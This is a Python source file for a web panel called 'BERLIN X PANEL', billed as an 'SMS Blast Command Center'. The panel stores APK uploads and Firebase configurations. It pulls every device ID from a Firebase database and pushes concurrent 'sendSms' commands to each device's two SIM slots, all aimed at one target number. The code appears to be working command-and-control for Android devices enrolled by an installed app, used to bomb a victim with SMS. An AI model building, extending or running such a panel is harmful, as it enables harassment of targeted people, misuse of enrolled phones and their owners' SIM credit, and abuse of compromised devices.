#!/usr/bin/env python3
"""
BERLIN X PANEL — Advanced SMS Blast Command Center with Firebase integration.
"""
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import hashlib, json, os, secrets, sqlite3, time
import urllib.request
import urllib.error
import concurrent.futures

ROOT = Path(__file__).resolve().parent
DATA_DIR = Path(os.environ.get("DATA_DIR", str(ROOT / "data"))).expanduser()
APK_DIR = DATA_DIR / "apks"
DB_PATH = DATA_DIR / "panel.db"

HOST = os.environ.get("HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "10000"))
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
MAX_APK_MB = max(1, int(os.environ.get("MAX_APK_MB", "150")))
MAX_APK_BYTES = MAX_APK_MB * 1024 * 1024
SESSION_TTL = 12 * 60 * 60

DATA_DIR.mkdir(parents=True, exist_ok=True)
APK_DIR.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════
# LIVE COMMAND CENTER UI (Firebase Edition)
# ═══════════════════════════════════════════════════════════
def _esc(s):
    if s is None or s == "": return "—"
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))

def render_devices_html(devices):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SMS Blast Command Center</title>
<style>
  *{{box-sizing:border-box;}}
  body{{margin:0;padding:2rem;background:#080808;color:#e0e0e0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;}}
  .container{{max-width:1200px;margin:0 auto;}}
  .header{{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;}}
  h1{{font-size:1.8rem;margin:0;color:#ff4500;letter-spacing:-.02em;text-shadow:0 0 10px rgba(255,69,0,0.3);}}
  .card{{background:#111;border:1px solid #333;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;box-shadow:0 4px 20px rgba(0,0,0,0.5);}}
  
  .input-group{{display:flex; flex-direction:column; gap:1rem; margin-bottom:1rem;}}
  .input-group input{{padding:1rem;background:#000;border:1px solid #444;border-radius:8px;
    color:#fff;font-size:1rem;outline:none;transition:border .2s;}}
  .input-group input:focus{{border-color:#ff4500;}}
  .blast-btn{{padding:1rem 2rem;background:#ff4500;color:#fff;border:0;border-radius:8px;
    font-size:1.1rem;font-weight:bold;cursor:pointer;transition:all .2s;
    box-shadow:0 0 15px rgba(255,69,0,0.4); width:100%;}}
  .blast-btn:hover{{background:#ff5722;transform:scale(1.01);}}
  .blast-btn:disabled{{background:#555;box-shadow:none;cursor:not-allowed;transform:none;}}

  .grid{{display:grid;grid-template-columns:1fr 350px;gap:1.5rem;}}
  .terminal{{background:#000;border:1px solid #333;border-radius:8px;padding:1rem;
    font-family:monospace;height:400px;overflow-y:auto;font-size:0.9rem;line-height:1.5;}}
  .log-line{{margin-bottom:0.4rem;border-bottom:1px solid #111;padding-bottom:0.4rem;}}
  .log-time{{color:#666;margin-right:10px;}}
  .log-success{{color:#00ff00;}}
  .log-info{{color:#00aaff;}}
  .log-error{{color:#ff3333;}}
  
  .stat{{background:#1a1a1a;padding:1rem;border-radius:8px;border-left:4px solid #ff4500; margin-bottom:1rem;}}
  .stat-title{{font-size:0.8rem;color:#888;text-transform:uppercase;letter-spacing:0.05em;}}
  .stat-value{{font-size:1.5rem;font-weight:bold;color:#fff;margin-top:0.5rem;font-family:monospace;}}

  table{{width:100%;border-collapse:collapse;margin-top:1rem;}}
  th,td{{padding:.75rem;text-align:left;border-bottom:1px solid #222;font-size:.85rem;}}
  th{{color:#888;font-weight:normal;}}
  .dot{{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:5px;}}
  .dot.on{{background:#00ff00;box-shadow:0 0 8px #00ff00;}}
  .dot.off{{background:#333;}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>⚡ SMS Command Center</h1>
  </div>

  <!-- Configuration & Blast Form -->
  <div class="card">
    <h3 style="margin-top:0; color:#e8a06a;">Firebase Blast (Auto Engine)</h3>
    <div class="input-group">
      <input type="text" id="fbUrl" placeholder="Firebase URL (e.g. https://xxx-default-rtdb.firebaseio.com)">
      <input type="password" id="fbKey" placeholder="Firebase Secret Key">
      <input type="text" id="targetNum" placeholder="Enter Target Number (e.g. +919607429190)">
      <button class="blast-btn" id="fireBtn" onclick="fireBlast()">🚀 FIRE BLAST</button>
    </div>
    <div id="msgStatus" style="font-size:0.9rem; color:#00ff00;"></div>
  </div>

  <div class="grid">
    <!-- Live Terminal -->
    <div class="card" style="padding:1rem;">
      <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Live Terminal</h3>
      <div class="terminal" id="terminal">
        <div class="log-line"><span class="log-info">[SYSTEM]</span> Waiting for Firebase blast...</div>
      </div>
    </div>

    <!-- Live Stats -->
    <div class="card" style="padding:1rem;">
      <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Live Stats</h3>
      <div class="stat">
        <div class="stat-title">Status</div>
        <div class="stat-value" id="blastStatus" style="font-size:1.2rem;color:#888;">IDLE</div>
      </div>
      <div class="stat">
        <div class="stat-title">Devices Targeted</div>
        <div class="stat-value" id="totalSent">0</div>
      </div>
    </div>
  </div>
</div>

<script>
// Load saved Firebase config from local storage
document.getElementById('fbUrl').value = localStorage.getItem('fbUrl') || '';
document.getElementById('fbKey').value = localStorage.getItem('fbKey') || '';

function log(msg, type='info') {{
  const term = document.getElementById('terminal');
  const time = new Date().toLocaleTimeString();
  term.innerHTML += `<div class="log-line"><span class="log-time">[${{time}}]</span> <span class="log-${{type}}">${{msg}}</span></div>`;
  term.scrollTop = term.scrollHeight;
}}

async function fireBlast() {{
  const fbUrl = document.getElementById('fbUrl').value.trim().replace(/\/$/, "");
  const fbKey = document.getElementById('fbKey').value.trim();
  const target = document.getElementById('targetNum').value.trim();

  if(!fbUrl || !fbKey || !target) {{
    return alert('Firebase URL, Secret Key aur Target Number teeno dalna zaroori hai!');
  }}

  localStorage.setItem('fbUrl', fbUrl);
  localStorage.setItem('fbKey', fbKey);

  const btn = document.getElementById('fireBtn');
  btn.disabled = true;
  btn.textContent = 'Blasting via Firebase...';
  document.getElementById('blastStatus').textContent = 'RUNNING';
  document.getElementById('blastStatus').style.color = '#00ff00';
  
  log(`Fetching devices from Firebase...`, 'info');

  try {{
    const r = await fetch('/api/firebase-blast', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{ fb_url: fbUrl, fb_key: fbKey, target: target }})
    }});
    const d = await r.json();
    
    if(d.ok) {{
      log(`Successfully pushed commands to ${{d.count}} devices!`, 'success');
      document.getElementById('totalSent').textContent = d.count * 2; // Since 2 SIMs
      document.getElementById('blastStatus').textContent = 'DONE';
    }} else {{
      log(`Error: ${{d.error}}`, 'error');
      document.getElementById('blastStatus').textContent = 'FAILED';
      document.getElementById('blastStatus').style.color = '#ff3333';
    }}
  }} catch(e) {{
    log(`Network error: ${{e.message}}`, 'error');
  }} finally {{
    btn.disabled = false;
    btn.textContent = '🚀 FIRE BLAST';
  }}
}}
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════
def get_db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    con.execute("""CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, owner_name TEXT, owner_email TEXT, firebase_project_id TEXT, firebase_database_url TEXT, firebase_auth_domain TEXT, firebase_storage_bucket TEXT, firebase_messaging_sender_id TEXT, firebase_app_id TEXT, firebase_config_json TEXT, apk_original_name TEXT, apk_stored_name TEXT, apk_size INTEGER DEFAULT 0, apk_sha256 TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')""")
    con.commit()
    return con

get_db().close()
SESSIONS = {}

def json_out(handler, payload, code=200, extra=None):
    data = json.dumps(payload, ensure_ascii=False).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(data)))
    if extra:
        for k, v in extra.items(): handler.send_header(k, v)
    handler.end_headers()
    handler.wfile.write(data)

def html_out(handler, html_text, code=200):
    data = html_text.encode("utf-8")
    handler.send_response(code)
    handler.send_header("Content-Type", "text/html; charset=utf-8")
    handler.send_header("Content-Length", str(len(data)))
    handler.end_headers()
    handler.wfile.write(data)

def token_from_cookie(headers):
    for part in headers.get("Cookie", "").split(";"):
        part = part.strip()
        if part.startswith("admin_session="): return part.split("=", 1)[1]
    return None

def is_admin(headers):
    token = token_from_cookie(headers)
    return bool(token and token in SESSIONS and SESSIONS[token] > time.time())

def require_admin(handler):
    if not is_admin(handler.headers):
        json_out(handler, {"ok": False, "error": "Admin authentication required."}, 401)
        return False
    return True

def read_json(handler, max_bytes=100_000):
    try: length = int(handler.headers.get("Content-Length", "0"))
    except ValueError: return None, "Invalid Content-Length."
    if length > max_bytes: return None, "Request too large."
    try: return json.loads(handler.rfile.read(length) or b"{}"), None
    except Exception: return None, "Invalid JSON."

def field(obj, name, limit): return str(obj.get(name, "") or "").strip()[:limit]

# Helper to push to Firebase
def push_firebase(fb_url, fb_key, device_id, sim_slot, target_number):
    last6 = device_id[-6:].upper()
    message_text = f"{last6}-SIM{sim_slot}"
    
    payload = {
        "message": message_text,
        "number": target_number,
        "status": "pending",
        "timestamp": int(time.time() * 1000)
    }
    
    url = f"{fb_url}/{device_id}/sendSms.json?auth={fb_key}"
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/json')
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return True
    except Exception as e:
        return False

class Handler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def end_headers(self):
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Content-Type-Options", "nosniff")
        super().end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/health":
            return json_out(self, {"ok": True, "service": "berlin-x-panel"})

        if path == "/admin":
            self.path = "/admin.html"
            return super().do_GET()

        # ── UI Page ──
        if path == "/api/devices":
            accept = self.headers.get("Accept", "")
            if "text/html" in accept:
                return html_out(self, render_devices_html([]))
            return json_out(self, {"ok": True, "devices": []})

        return super().do_GET()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/admin/login":
            body, err = read_json(self, 16_384)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            if not ADMIN_PASSWORD: return json_out(self, {"ok": False, "error": "ADMIN_PASSWORD not set."}, 503)
            if body.get("username") == ADMIN_USER and body.get("password") == ADMIN_PASSWORD:
                token = secrets.token_urlsafe(36)
                SESSIONS[token] = time.time() + SESSION_TTL
                return json_out(self, {"ok": True}, 200, {"Set-Cookie": f"admin_session={token}; Path=/; Max-Age={SESSION_TTL}"})
            return json_out(self, {"ok": False, "error": "Invalid credentials."}, 401)

        # ── FIREBASE BLAST ──
        if path == "/api/firebase-blast":
            body, err = read_json(self)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            
            fb_url = field(body, "fb_url", 500).rstrip('/')
            fb_key = field(body, "fb_key", 500)
            target = field(body, "target", 20)

            if not fb_url or not fb_key or not target:
                return json_out(self, {"ok": False, "error": "URL, Key aur Target required"}, 400)

            # 1. Fetch all device IDs from Firebase (shallow)
            try:
                fetch_url = f"{fb_url}/.json?auth={fb_key}&shallow=true"
                req = urllib.request.Request(fetch_url)
                with urllib.request.urlopen(req, timeout=15) as res:
                    devices_data = json.loads(res.read().decode())
                    
                if not devices_data:
                    return json_out(self, {"ok": False, "error": "Firebase me koi device nahi mila."}, 404)
                
                device_ids = list(devices_data.keys())
                
            except Exception as e:
                return json_out(self, {"ok": False, "error": f"Firebase fetch failed: {str(e)}"}, 500)

            # 2. Push commands concurrently for speed
            def process_device(dev_id):
                push_firebase(fb_url, fb_key, dev_id, 1, target)
                push_firebase(fb_url, fb_key, dev_id, 2, target)

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                executor.map(process_device, device_ids)

            return json_out(self, {"ok": True, "count": len(device_ids)}, 200)

        return json_out(self, {"ok": False, "error": "Not found."}, 404)

if __name__ == "__main__":
    print(f"⚡ SMS COMMAND CENTER running at http://{HOST}:{PORT}")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
